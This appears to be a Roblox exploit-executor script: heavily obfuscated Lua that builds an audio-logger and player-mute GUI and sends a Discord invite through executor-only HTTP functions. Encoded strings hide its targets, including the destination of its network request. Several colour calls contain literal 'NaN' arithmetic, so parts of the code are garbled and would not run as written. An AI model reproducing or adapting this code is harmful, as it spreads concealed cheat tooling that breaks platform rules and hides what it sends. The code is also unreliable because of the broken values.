v16:Create(v173.Bar,TweenInfo.new(0.45,Enum.EasingStyle.Quint,Enum.EasingDirection.Out),{[v7("\119\67\212\112","\80\36\42\174\21")]=UDim2.new(0,v216-v173.AbsolutePosition.X ,1 + 0 ,0 + 0 )}):Play();v318=3;end if (v318==(3 + 0)) then local v395=0;while true do if (v395==1) then v318=1549 -(320 + 1225) ;break;end if (v395==0) then v319=(0 -0) + (((v218-v12.Playback.AbsolutePosition.X)/v173.AbsoluteSize.X) * (v10.TimeLength-(0 + 0))) ;v319=(math.floor((v319/(1474 -(157 + 1307))) + (1859.5 -(821 + 1038)) ) * 10 * (24949903 -14949903))/(1093621 + 8906379) ;v395=1 -0 ;end end end if (v318==(1 + 0)) then if (v218<v173.AbsolutePosition.X) then v218=v173.AbsolutePosition.X;elseif (v218>(v173.AbsolutePosition.X + v173.AbsoluteSize.X)) then v218=v173.AbsolutePosition.X + v173.AbsoluteSize.X ;end if (v216<(v173.AbsolutePosition.X + (12 -7))) then v216=v173.AbsolutePosition.X + (1031 -(834 + 192)) ;elseif (v216>(v173.AbsolutePosition.X + v173.AbsoluteSize.X)) then v216=v173.AbsolutePosition.X + v173.AbsoluteSize.X ;end v318=1 + 1 ;end if ((0 + 0)==v318) then v218=v18:GetMouseLocation().X;v216=v216 + (0.025 * (v218-v217)) ;v318=1 + 0 ;end end else local v322=0;while true do if (v322==(0 -0)) then v16:Create(v173.Bar,TweenInfo.new(304.3 -(300 + 4) ,Enum.EasingStyle.Quint,Enum.EasingDirection.Out),{[v7("\138\42\177\113","\212\217\67\203\20\223\223\37")]=UDim2.new(0,(((v218-v173.AbsolutePosition.X)>1) and (v218-v173.AbsolutePosition.X)) or 5 ,1 + 0 ,0 -0 )}):Play();v219:Disconnect();break;end end end end);end);elseif v81 then local v256=362 -(112 + 250) ;while true do if (v256==0) then warn(v81);Message({[v7("\142\132\188\222\191","\178\218\237\200")]=v7("\147\167\244\223\164\244","\176\214\213\134"),[v7("\217\168\165\199\169\81\92","\57\148\205\214\180\200\54")]=v81});break;end end end end function Scan(v82) for v144,v145 in pairs(v82:GetChildren()) do if v145:IsA(v7("\33\242\32\58\114","\22\114\157\85\84")) then if  not v11.AudioListFrame.List.Results.Clip.Content:FindFirstChild(v145.Name) then local v282=0;local v283;while true do if ((1 + 0)==v282) then v283.Name=v145.Name;v283.Parent=v11.AudioListFrame.List.Results.Clip.Content;v282=4 -2 ;end if (v282==(0 + 0)) then v283=UI.Assets.LogTemplate:Clone();v283.Label.Text=v145.Name;v282=1 + 0 ;end if (v282==(2 + 0)) then v283.OpenINFO.MouseButton1Down:Connect(function() OpenSoundInfo(v145.SoundId,v145.Name,v82);end);break;end end end end end end v11.AudioListFrame.List.Query.Search:GetPropertyChangedSignal(v7("\240\206\11\208","\200\164\171\115\164\61\150")):Connect(function() FilterSoundResults(v11.AudioListFrame.List.Query.Search.Text,v11.AudioListFrame.List.Results.Clip.Content);end);task.spawn(function() local v83=0 + 0 ;local v84;local v85;local v86;local v87;local v88;while true do if (v83==(0 + 0)) then v84=nil;v85=nil;v83=1415 -(1001 + 413) ;end if (v83==2) then v88=nil;function v88(v257) local v258=0 -0 ;local v259;local v260;local v261;while true do if (v258==0) then v259=882 -(244 + 638) ;v260=nil;v258=694 -(627 + 66) ;end if ((2 -1)==v258) then v261=nil;while true do if (v259==(603 -(512 + 90))) then v16:Create(UI.Base,TweenInfo.new(1906.2 -(1665 + 241) ),{[v7("\142\251\16\76\151\183\251\13","\227\222\148\99\37")]=v261}):Play();break;end if (v259==(717 -(373 + 344))) then v260=v257.Position-v86 ;v261=UDim2.new(v87.X.Scale,v87.X.Offset + v260.X ,v87.Y.Scale,v87.Y.Offset + v260.Y );v259=1;end end break;end end end v83=3;end if (v83==1) then v86=Vector3.new(0,0,0 + 0 );v87=nil;v83=1 + 1 ;end if (v83==(10 -6)) then v18.InputChanged:Connect(function(v262) if ((v262==v85) and v84) then v88(v262);end end);break;end if (v83==(4 -1)) then UI.Base.Drag.InputBegan:Connect(function(v263) if ((v263.UserInputType==Enum.UserInputType.MouseButton1) or (v263.UserInputType==Enum.UserInputType.Touch)) then local v323=0;local v324;while true do if (v323==0) then v324=1099 -(35 + 1064) ;while true do if (v324==(1 + 0)) then v87=UI.Base.Position;v263.Changed:Connect(function() if (v263.UserInputState==Enum.UserInputState.End) then v84=false;end end);break;end if (v324==(0 -0)) then v84=true;v86=v263.Position;v324=1;end end break;end end end end);UI.Base.Drag.InputChanged:Connect(function(v264) if ((v264.UserInputType==Enum.UserInputType.MouseMovement) or (v264.UserInputType==Enum.UserInputType.Touch)) then v85=v264;end end);v83=4;end end end);task.spawn(function() while game:GetService(v7("\1\71\92\197\252\33\68\91\245\252","\153\83\50\50\150")).Heartbeat:wait() do for v178,v179 in next,game:GetService(v7("\109\122\114\5\118\185\94","\45\61\22\19\124\19\203")):GetPlayers() do if v179:FindFirstChild(v7("\232\1\32\224\22\117\189","\217\161\114\109\149\98\16")) then for v284,v285 in pairs(v179.Character:GetDescendants()) do if ((v285:IsA(v7("\38\47\55\112","\20\114\64\88\28\220")) and (v285.Name==v7("\19\14\221\185\218\223\165","\221\81\97\178\212\152\176"))) or v285:FindFirstChild(v7("\227\226\10\200\21\195\224","\122\173\135\125\155")) or v285:FindFirstChild(v7("\182\196\13\182\43\52","\168\228\161\96\217\95\81"))) then v285.Handle.Sound.Playing=false;end end end end end end);for v89,v90 in pairs(v9.Tabs.Container:GetChildren()) do if  not (v90:IsA(v7("\238\248\2\85\60\67\247\208\55\83\58\67","\55\187\177\78\60\79")) or v90:IsA(v7("\24\231\111\234\66\203\137\35\201","\224\77\174\63\139\38\175"))) then v90.MouseButton1Down:Connect(function() if v10.Playing then v10.Playing= not v10.Playing;end ChangeTab(v90.Name);end);end end for v91,v92 in pairs(v11.Buttons.Container:GetChildren()) do if  not (v92:IsA(v7("\177\104\116\39\151\85\116\47\157\78\77\58","\78\228\33\56")) or v92:IsA(v7("\251\87\130\2\129\202\119\188\4","\229\174\30\210\99"))) then local v180=0 + 0 ;while true do if ((1237 -(298 + 938))==v180) then v92.MouseButton1Down:Connect(function() if (v92.Name==v7("\60\236\139\84","\89\123\141\230\49\141\93")) then Scan(game);else Scan(game:GetService(v92.Name));end end);break;end if (v180==(1259 -(233 + 1026))) then v92.MouseEnter:Connect(function() local v325=1666 -(636 + 1030) ;while true do if (v325==0) then v11.ButtonHoverTitle.Text=v92.Name;v11.ButtonHoverTitle.Visible=true;break;end end end);v92.MouseLeave:Connect(function() v11.ButtonHoverTitle.Visible=false;end);v180=1 + 0 ;end end end end v19.PlayerAdded:Connect(function(v93) local v94=0 + 0 ;local v95;local v96;while true do if (v94==0) then if v13.List.Results.Clip.Content:FindFirstChild(v93.Name) then return;end v95=false;v94=1 + 0 ;end if (v94==(1 + 1)) then v96.DisplayName.Text=v93.DisplayName;v96.PlayerName.Text=v93.Name;v94=224 -(55 + 166) ;end if (v94==(1 + 2)) then v96.PlayerIcon.Image=game.Players:GetUserThumbnailAsync(v93.UserId,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size420x420);v96.Parent=v13.List.Results.Clip.Content;v94=1 + 3 ;end if (v94==(15 -11)) then v96.Mute.MouseButton1Down:Connect(function() local v265,v266=pcall(function() for v327,v328 in pairs(v35(v93)) do if v328:FindFirstChild(v7("\218\98\219\25\4\79\247","\42\147\17\150\108\112")) then local v383=0;while true do if (v383==(297 -(36 + 261))) then ToggleMutePlayer(v328,false);v95=false;break;end end else ToggleMutePlayer(v328,true);v95=true;end end end);if v265 then if v95 then v96.Mute.Icon.Image=v32.Success;wait(3.2 -1 );v96.Mute.Icon.Image=v32.UnMute;else local v387=0;while true do if (v387==1) then v96.Mute.Icon.Image=v32.Mute;break;end if (v387==(1368 -(34 + 1334))) then v96.Mute.Icon.Image=v32.Success;wait(2.2);v387=1 + 0 ;end end end elseif v266 then warn(v266);v96.Mute.Icon.Image=v32.Error;wait(2.2);v96.Mute.Icon.Image=v32.Mute;end end);break;end if (1==v94) then local v227=0;while true do if (v227==(0 + 0)) then v96=UI.Assets.PlayerLog:Clone();v96.Name=v93.Name;v227=1284 -(1035 + 248) ;end if (v227==(22 -(20 + 1))) then v94=2 + 0 ;break;end end end end end);for v97,v98 in pairs(v19:GetChildren()) do if v13.List.Results.Clip.Content:FindFirstChild(v98.Name) then return;end local v99=false;local v100=UI.Assets.PlayerLog:Clone();v100.Name=v98.Name;v100.DisplayName.Text=v98.DisplayName;v100.PlayerName.Text=v98.Name;v100.PlayerIcon.Image=game.Players:GetUserThumbnailAsync(v98.UserId,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size420x420);v100.Parent=v13.List.Results.Clip.Content;v100.Mute.MouseButton1Down:Connect(function() local v146=319 -(134 + 185) ;local v147;local v148;local v149;while true do if (v146==(1134 -(549 + 584))) then v149=nil;while true do if (v147==(685 -(314 + 371))) then v148,v149=pcall(function() for v400,v401 in pairs(v35(v98)) do if v401:FindFirstChild(v7("\38\181\0\106\243\237\11","\136\111\198\77\31\135")) then local v436=0 -0 ;while true do if (v436==(968 -(478 + 490))) then ToggleMutePlayer(v401,false);v99=false;break;end end else ToggleMutePlayer(v401,true);v99=true;end end end);if v148 then if v99 then local v437=0 + 0 ;while true do if ((1173 -(786 + 386))==v437) then v100.Mute.Icon.Image=v32.UnMute;break;end if (v437==(0 -0)) then v100.Mute.Icon.Image=v32.Success;wait(2.2);v437=1380 -(1055 + 324) ;end end else local v438=1340 -(1093 + 247) ;while true do if (v438==(0 + 0)) then v100.Mute.Icon.Image=v32.Success;wait(1.2000000000000002 + 1 );v438=3 -2 ;end if (v438==1) then v100.Mute.Icon.Image=v32.Mute;break;end end end elseif v149 then warn(v149);v100.Mute.Icon.Image=v32.Error;wait(2.2);v100.Mute.Icon.Image=v32.Mute;end break;end end break;end if (v146==(0 -0)) then v147=0 -0 ;v148=nil;v146=2 -1 ;end end end);end v19.PlayerAdded:Connect(function(v109) v13.List.Results.Clip.Content:FindFirstChild(v109.Name):Destroy();end);v13.List.Query.Search:GetPropertyChangedSignal(v7("\54\12\191\66","\201\98\105\199\54\221\132\119")):Connect(function() FilterSoundResults(v13.List.Query.Search.Text,v13.List.Results.Clip.Content);end);local v36=v14.Content.BorderColorPicker.ColorPicker;local v37=v36.CPBackground;local v38=v37.Display;local v39=v37.MainCP;local v40=v36.ColorSlider;v36.Parent.SelectedColor.ImageColor3=v31.BorderColor;game:GetService(v7("\140\31\134\51\43\59\188\172\24\176\36\16\35\165\186\9","\204\217\108\227\65\98\85")).InputEnded:Connect(function(v110,v111) if (v110.UserInputType==Enum.UserInputType.MouseButton1) then local v181=0;local v182;while true do if (v181==0) then v182=0 + 0 ;while true do if (v182==(0 -0)) then mainDragging=false;sliderDragging=false;break;end end break;end end end end);v39.MouseButton1Down:Connect(function() mainDragging=true;end);v39.MainPoint.MouseButton1Down:Connect(function() mainDragging=true;end);v40.MouseButton1Down:Connect(function() sliderDragging=true;end);v40.SliderPoint.MouseButton1Down:Connect(function() sliderDragging=true;end);local v43,v44,v45=v31.BorderColor:ToHSV();local v46=Color3.fromHSV(v43,v44,v45);local v47=string.format(v7("\29\134\165\183\20\133\14\145\205\160\124\146\102","\160\62\163\149\133\76"),v46.R * (878 -623) ,v46.G * (193 + 62) ,v46.B * 255 );local function v48() local v112=0 -0 ;local v113;local v114;local v115;local v116;local v117;while true do if (v112==(689 -(364 + 324))) then v36.Parent.SelectedColor.ImageColor3=Color3.fromHSV(v43,v44,v45);v113=v43 * v40.AbsoluteSize.X ;v40.SliderPoint.Position=UDim2.new(0,v113-(v40.SliderPoint.AbsoluteSize.X/(5 -3)) ,0.5 -0 ,0);v40.SliderPoint.ImageColor3=Color3.fromHSV(v43,1 + 0 ,4 -3 );v112=2 -0 ;end if (v112==(5 -3)) then v114=Color3.fromHSV(v43,v44,v45);v115,v116,v117=math.floor((v114.R * (1523 -(1249 + 19))) + 0.5 + 0 ),math.floor((v114.G * (992 -737)) + 0.5 ),math.floor((v114.B * (1341 -(686 + 400))) + 0.5 + 0 );v36.R.Inpt.Text=tostring(v115);v36.G.Inpt.Text=tostring(v116);v112=232 -(73 + 156) ;end if (v112==(1 + 2)) then v36.B.Inpt.Text=tostring(v117);v47=string.format(v7("\149\229\93\125\251\147\240\95\23\134\134\242\53","\163\182\192\109\79"),v114.R * (1066 -(721 + 90)) ,v114.G * (3 + 252) ,v114.B * (827 -572) );break;end if (v112==(470 -(224 + 246))) then v39.MainPoint.Position=UDim2.new(v44, -v39.MainPoint.AbsoluteSize.X/(2 -0) ,(1 -0) -v45 , -v39.MainPoint.AbsoluteSize.Y/(1 + 1) );v39.MainPoint.ImageColor3=Color3.fromHSV(v43,v44,v45);v37.BackgroundColor3=Color3.fromHSV(v43,1 + 0 ,1);v38.BackgroundColor3=Color3.fromHSV(v43,v44,v45);v112=1 + 0 ;end end end v48();local function v49(v118,v119) local v120=0 -0 ;local v121;local v122;local v123;local v124;local v125;local v126;local v127;local v128;local v129;while true do if (v120==4) then pcall(function() local v267=0;while true do if (v267==0) then UpdateBorderColor(Color3.fromHSV(v43,v44,v45));v31.BorderColor=Color3.fromHSV(v43,v44,v45);break;end end end);break;end if (v120==2) then if (v119=="R") then v126=v123;v123=v121;elseif (v119=="G") then local v342=0 -0 ;while true do if (v342==0) then v126=v124;v124=v121;break;end end else local v343=0;while true do if (v343==0) then v126=v125;v125=v121;break;end end end if v121 then local v287=513 -(203 + 310) ;while true do if (v287==0) then v121=math.clamp(v121,1993 -(1238 + 755) ,18 + 237 );v43,v44,v45=Color3.fromRGB(v123,v124,v125):ToHSV();v287=1535 -(709 + 825) ;end if (v287==(1 -0)) then v48();break;end end else v118.Text=tostring(v126);end v120=3 -0 ;end if (v120==(867 -(196 + 668))) then v127,v128,v129=math.floor((v43 * (1006 -751)) + (0.5 -0) ),math.floor((v44 * (1088 -(171 + 662))) + 0.5 ),math.floor((v45 * 255) + (93.5 -(4 + 89)) );v36.Parent.SelectedColor.ImageColor3=Color3.fromHSV(v43,v44,v45);v120=13 -9 ;end if ((0 + 0)==v120) then local v239=0 -0 ;while true do if (v239==(1 + 0)) then v120=1;break;end if (v239==(1486 -(35 + 1451))) then v121=tonumber(v118.Text);v122=Color3.fromHSV(v43,v44,v45);v239=1454 -(28 + 1425) ;end end end if (v120==(1994 -(941 + 1052))) then v123,v124,v125=math.floor((v122.R * (245 + 10)) + (1514.5 -(822 + 692)) ),math.floor((v122.G * (363 -108)) + 0.5 ),math.floor((v122.B * (121 + 134)) + (297.5 -(45 + 252)) );v126=nil;v120=2;end end end v36.R.Inpt.FocusLost:connect(function() v49(v36.R.Inpt,"R");pcall(function() local v150=0 + 0 ;local v151;while true do if (v150==(0 + 0)) then v151=0 -0 ;while true do if (v151==0) then UpdateBorderColor(Color3.fromHSV(v43,v44,v45));v31.BorderColor=Color3.fromHSV(v43,v44,v45);break;end end break;end end end);end);v36.G.Inpt.FocusLost:connect(function() v49(v36.G.Inpt,"G");pcall(function() local v152=433 -(114 + 319) ;while true do if ((0 -0)==v152) then UpdateBorderColor(Color3.fromHSV(v43,v44,v45));v31.BorderColor=Color3.fromHSV(v43,v44,v45);break;end end end);end);v36.B.Inpt.FocusLost:connect(function() local v130=0 -0 ;while true do if (v130==0) then v49(v36.B.Inpt,"B");pcall(function() local v269=0 + 0 ;local v270;while true do if (0==v269) then v270=0 -0 ;while true do if (v270==(0 -0)) then UpdateBorderColor(Color3.fromHSV(v43,v44,v45));v31.BorderColor=Color3.fromHSV(v43,v44,v45);break;end end break;end end end);break;end end end);local v50=game.Players.LocalPlayer:GetMouse();game:GetService(v7("\6\51\14\243\240\38\48\9\195\240","\149\84\70\96\160")).RenderStepped:connect(function() if mainDragging then local v183=1963 -(556 + 1407) ;local v184;local v185;local v186;local v187;local v188;local v189;while true do if (v183==0) then local v289=0;while true do if (v289==(1207 -(741 + 465))) then v39.MainPoint.Position=UDim2.new(0,v184-(v39.MainPoint.AbsoluteSize.X/2) ,465 -(170 + 295) ,v185-(v39.MainPoint.AbsoluteSize.Y/(2 + 0)) );v183=1;break;end if (v289==(0 + 0)) then v184=math.clamp(v50.X-v39.AbsolutePosition.X ,0 -0 ,v39.AbsoluteSize.X);v185=math.clamp(v50.Y-v39.AbsolutePosition.Y ,0,v39.AbsoluteSize.Y);v289=1 + 0 ;end end end if (v183==1) then v44=v184/v39.AbsoluteSize.X ;v45=(1 + 0) -(v185/v39.AbsoluteSize.Y) ;v38.BackgroundColor3=Color3.fromHSV(v43,v44,v45);v183=2 + 0 ;end if (v183==(1232 -(957 + 273))) then v39.MainPoint.ImageColor3=Color3.fromHSV(v43,v44,v45);v36.Parent.SelectedColor.ImageColor3=Color3.fromHSV(v43,v44,v45);v37.BackgroundColor3=Color3.fromHSV(v43,1 + 0 ,1 + 0 );v183=11 -8 ;end if ((10 -6)==v183) then v36.G.Inpt.Text=tostring(v188);v36.B.Inpt.Text=tostring(v189);pcall(function() local v331=0 -0 ;local v332;while true do if (v331==(0 -0)) then v332=1780 -(389 + 1391) ;while true do if (v332==0) then UpdateBorderColor(Color3.fromHSV(v43,v44,v45));v31.BorderColor=Color3.fromHSV(v43,v44,v45);break;end end break;end end end);break;end if (v183==3) then local v296=0 + 0 ;while true do if (v296==(0 + 0)) then v186=Color3.fromHSV(v43,v44,v45);v187,v188,v189=math.floor((v186.R * (580 -325)) + (951.5 -(783 + 168)) ),math.floor((v186.G * 255) + 0.5 ),math.floor((v186.B * 255) + 0.5 );v296=3 -2 ;end if (v296==1) then v36.R.Inpt.Text=tostring(v187);v183=4 + 0 ;break;end end end end end if sliderDragging then local v190=311 -(309 + 2) ;local v191;local v192;local v193;local v194;local v195;while true do if (2==v190) then v192=Color3.fromHSV(v43,v44,v45);v193,v194,v195=math.floor((v192.R * (783 -528)) + (1212.5 -(1090 + 122)) ),math.floor((v192.G * (83 + 172)) + 0.5 ),math.floor((v192.B * (856 -601)) + 0.5 + 0 );v36.R.Inpt.Text=tostring(v193);v36.G.Inpt.Text=tostring(v194);v190=3;end if (v190==(1119 -(628 + 490))) then v40.SliderPoint.ImageColor3=Color3.fromHSV(v43,1 + 0 ,2 -1 );v37.BackgroundColor3=Color3.fromHSV(v43,4 -3 ,1);v39.MainPoint.ImageColor3=Color3.fromHSV(v43,v44,v45);v36.Parent.SelectedColor.ImageColor3=Color3.fromHSV(v43,v44,v45);v190=776 -(431 + 343) ;end if (3==v190) then v36.B.Inpt.Text=tostring(v195);pcall(function() UpdateBorderColor(Color3.fromHSV(v43,v44,v45));v31.BorderColor=Color3.fromHSV(v43,v44,v45);end);break;end if ((0 -0)==v190) then v191=math.clamp(v50.X-v40.AbsolutePosition.X ,0 -0 ,v40.AbsoluteSize.X);v43=v191/v40.AbsoluteSize.X ;v38.BackgroundColor3=Color3.fromHSV(v43,v44,v45);v40.SliderPoint.Position=UDim2.new(0 + 0 ,v191-(v40.SliderPoint.AbsoluteSize.X/(1 + 1)) ,1695.5 -(556 + 1139) ,15 -(6 + 9) );v190=1 + 0 ;end end end end);local v51=v9.Body.Pages:FindFirstChild(v7("\11\3\25\249\49\8\10\254","\141\88\102\109")).Content;v51.RGBBorder.Toggle.MouseButton1Down:Connect(function() if v31.RGBBorder then v31.RGBBorder=false;v16:Create(v51.RGBBorder.Toggle.Label,TweenInfo.new(0.24 + 0 ,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut),{[v7("\135\86\210\100\46\47\84\207\160\67\203\98\31\51\86\216","\161\211\51\170\16\122\93\53")]=170 -(28 + 141) }):Play();else local v197=0 + 0 ;while true do if (v197==0) then v31.RGBBorder=true;v16:Create(v51.RGBBorder.Toggle.Label,TweenInfo.new(0.24 -0 ,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut),{[v7("\207\171\170\60\207\188\179\38\232\190\179\58\254\160\177\49","\72\155\206\210")]=0 + 0 }):Play();break;end end end end);v51.FadeAudioMute.Toggle.MouseButton1Down:Connect(function() if v31.FadingMute then local v198=1317 -(486 + 831) ;local v199;while true do if (v198==(0 -0)) then v199=0;while true do if (v199==(0 -0)) then v31.FadingMute=false;v16:Create(v51.FadeAudioMute.Toggle.Label,TweenInfo.new(0.24 + 0 ,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut),{[v7("\114\127\76\26\7\84\123\90\29\35\71\104\81\0\48\95","\83\38\26\52\110")]=3 -2 }):Play();break;end end break;end end else local v200=1263 -(668 + 595) ;local v201;while true do if (v200==0) then v201=0 + 0 ;while true do if (v201==0) then v31.FadingMute=true;v16:Create(v51.FadeAudioMute.Toggle.Label,TweenInfo.new(0.24 + 0 ,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut),{[v7("\108\18\63\82\108\5\38\72\75\7\38\84\93\25\36\95","\38\56\119\71")]=0 -0 }):Play();break;end end break;end end end end);task.spawn(function() while wait() do if (v31.RGBBorder==true) then local v240=0;while true do if (v240==(294 -(23 + 267))) then for v345=2199 -(1129 + 815) ,387 -(371 + 16) , -(1760 -(1326 + 424)) do local v346=0 -0 ;local v347;while true do if (v346==2) then v9.Border.Border.ImageColor3=v347;break;end if (v346==(3 -2)) then v9.MessageBox.Border.ImageColor3=v347;v9.Border.ImageColor3=v347;v346=120 -(88 + 30) ;end if (v346==(771 -(720 + 51))) then wait();v347=Color3.new(255/(567 -312) ,NaN-(421 + 1355) ,v345/(420 -165) );v346=1 + 0 ;end end end break;end if (v240==(1084 -(286 + 797))) then v9.Border.Border.ImageColor3=Color3.new(255/255 ,NaN-  -64104119 ,NaN-(38 + 127) );for v348=0 -0 ,249 + 6 ,15 -5  do local v349=785 -(222 + 563) ;local v350;while true do if (v349==2) then v9.Border.Border.ImageColor3=v350;break;end if ((1 -0)==v349) then v9.MessageBox.Border.ImageColor3=v350;v9.Border.ImageColor3=v350;v349=2;end if (v349==0) then wait();v350=Color3.new((184 + 71)/(445 -(23 + 167)) ,v348/(2053 -(690 + 1108)) ,NaN);v349=1;end end end v240=1 + 1 ;end if (v240==(3 + 0)) then for v351=1103 -(40 + 808) ,0, -(2 + 8) do wait();local v352=Color3.new(NaN,v351/255 ,255/(975 -720) );v9.MessageBox.Border.ImageColor3=v352;v9.Border.ImageColor3=v352;v9.Border.Border.ImageColor3=v352;end for v356=0,244 + 11 ,10 do local v357=0;local v358;while true do if (v357==(1 + 0)) then v9.MessageBox.Border.ImageColor3=v358;v9.Border.ImageColor3=v358;v357=2 + 0 ;end if (v357==0) then wait();v358=Color3.new(v356/(826 -(47 + 524)) ,NaN-0 ,255/(381 -126) );v357=2 -1 ;end if (v357==2) then v9.Border.Border.ImageColor3=v358;break;end end end v240=4;end if (v240==(1726 -(1165 + 561))) then v9.MessageBox.Border.ImageColor3=Color3.new((8 + 247)/(789 -534) ,NaN-(341 + 138) ,NaN);v9.Border.ImageColor3=Color3.new((69 + 186)/(526 -271) ,NaN,NaN-(89 + 237) );v240=3 -2 ;end if (v240==(3 -1)) then for v359=1136 -(581 + 300) ,1220 -(855 + 365) , -10 do local v360=0 -0 ;local v361;while true do if (v360==(0 + 0)) then wait();v361=Color3.new(v359/(1490 -(1030 + 205)) ,255/(240 + 15) ,NaN-(54 + 311) );v360=1;end if (v360==(1 + 0)) then v9.MessageBox.Border.ImageColor3=v361;v9.Border.ImageColor3=v361;v360=302 -(180 + 120) ;end if (v360==(2 -0)) then v9.Border.Border.ImageColor3=v361;break;end end end for v362=0 -0 ,255,3 + 7  do local v363=0 + 0 ;local v364;while true do if (v363==(71 -(10 + 59))) then v9.Border.Border.ImageColor3=v364;break;end if (v363==1) then v9.MessageBox.Border.ImageColor3=v364;v9.Border.ImageColor3=v364;v363=1 + 1 ;end if (v363==0) then wait();v364=Color3.new(NaN-  -4366130 ,(1418 -(671 + 492))/(203 + 52) ,v362/(1470 -(369 + 846)) );v363=1;end end end v240=1 + 2 ;end end end end end);local v52;UI.Base.Drag.Collapse.MouseButton1Down:Connect(function() local v131=0 + 0 ;while true do if (v131==(1946 -(1036 + 909))) then v16:Create(UI.OpenButtonHolder,TweenInfo.new(0.7,Enum.EasingStyle.Quart,Enum.EasingDirection.Out),{[v7("\230\142\236\64\203\223\142\241","\191\182\225\159\41")]=UDim2.new(1 + 0 ,0 -0 ,1,203 -(11 + 192) )}):Play();break;end if (v131==(0 + 0)) then v52=UI.Base.Position;v16:Create(UI.Base,TweenInfo.new(175.76 -(135 + 40) ,Enum.EasingStyle.Quart,Enum.EasingDirection.Out),{[v7("\195\224\75\223\49\95\252\225","\54\147\143\56\182\69")]=UDim2.new(1.5,0 -0 ,0.5 + 0 ,0)}):Play();v131=2 -1 ;end end end);UI.OpenButtonHolder.Open.MouseButton1Down:Connect(function() local v132=0;while true do if (v132==(0 -0)) then v16:Create(UI.Base,TweenInfo.new(176.76 -(50 + 126) ,Enum.EasingStyle.Quart,Enum.EasingDirection.Out),{[v7("\27\29\59\92\159\142\205\37","\162\75\114\72\53\235\231")]=v52}):Play();v16:Create(UI.OpenButtonHolder,TweenInfo.new(2.4 -1 ,Enum.EasingStyle.Quart,Enum.EasingDirection.Out),{[v7("\188\51\87\235\71\11\131\50","\98\236\92\36\130\51")]=UDim2.new(1.32,0,1 + 0 ,1413 -(1233 + 180) )}):Play();break;end end end);v9.Body.Pages.Settings.Content.Discord.Toggle.MouseButton1Down:Connect(function() local v133=v9.Prompts.JoinDiscord;v133.Visible=true;wait(2);v133.Inner.Content.Value.Title.Text=v7("\160\16\31\185\74\186\177\126\163\30\67","\80\196\121\108\218\37\200\213")   .. tostring(UI.Info.DiscordCode.Value) ;v133.Inner.Content.Add.MouseButton1Down:Connect(function() v133.Visible=false;print(v7("\42\124\11\113\66\0\141","\234\96\19\98\31\43\110"));local v154=http_request or (syn and syn.request) or request or nil ;if v154 then local v242=UI.Info.DiscordCode or v7("\53\60\115\240\254\121\184\49\30\122","\235\102\127\50\167\204\18") ;v154({[v7("\125\164\225\43\75\42","\78\48\193\149\67\36")]=v7("\0\49\179\44","\33\80\126\224\120"),[v7("\196\173\2\192\89\254\187","\60\140\200\99\164")]={[v7("\136\230\13\33\171\137","\194\231\148\100\70")]=v7("\78\88\213\179\229\146\9\3\197\170\229\203\73\94\197\237\245\199\75","\168\38\44\161\195\150"),[v7("\163\243\140\98\53\230\162\91\180\229\146\115","\118\224\156\226\22\80\136\214")]=v7("\67\254\73\140\75\237\88\148\75\225\87\207\72\253\86\142","\224\34\142\57")},[v7("\235\181\201","\110\190\199\165\189\19\145\61")]=v7("\210\255\99\248\209\136\149\186\37\191\197\151\148\187\57\185\209\145\142\189\36\167\153\215\217\180\97\181\218","\167\186\139\23\136\235"),[v7("\56\186\140\20","\109\122\213\232")]=game:GetService(v7("\198\227\182\32\221\242\176\38\231\244\167","\80\142\151\194")):JSONEncode({[v7("\0\203\115","\44\99\166\23")]=v7("\85\217\31\31\7\129\67\213\27\25\4\151\89\197","\196\28\151\73\86\83"),[v7("\242\17\46\3","\22\147\99\73\112\226\56\120")]={[v7("\187\122\230\240","\237\216\21\130\149")]=v242},[v7("\140\65\81\92\181","\62\226\46\63\63\208\169")]=game:GetService(v7("\205\13\65\147\44\8\61\72\236\26\80","\62\133\121\53\227\127\109\79")):GenerateGUID(false):lower()})});end end);v133.Parent.PromptShadow.MouseButton1Down:Connect(function() if v133.Visible then v133.Visible=false;end end);v133.Inner.Buttons.Cancel.MouseButton1Down:Connect(function() if v133.Visible then v133.Visible=false;end end);end);UpdateBorderColor(v31.BorderColor);if  not v20:IsStudio() then if gethui then UI.Parent=gethui();elseif syn.protect_gui then syn.protect_gui(UI);UI.Parent=v22;elseif v22:FindFirstChild(v7("\34\27\48\249\217\182\133\5\29","\194\112\116\82\149\182\206")) then UI.Parent=v22:FindFirstChild(v7("\11\167\78\20\207\250\41\44\161","\110\89\200\44\120\160\130"));else UI.Parent=v22;end else UI.Parent=game.Players.LocalPlayer.PlayerGui;end
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_53);

return G2L["1"], require;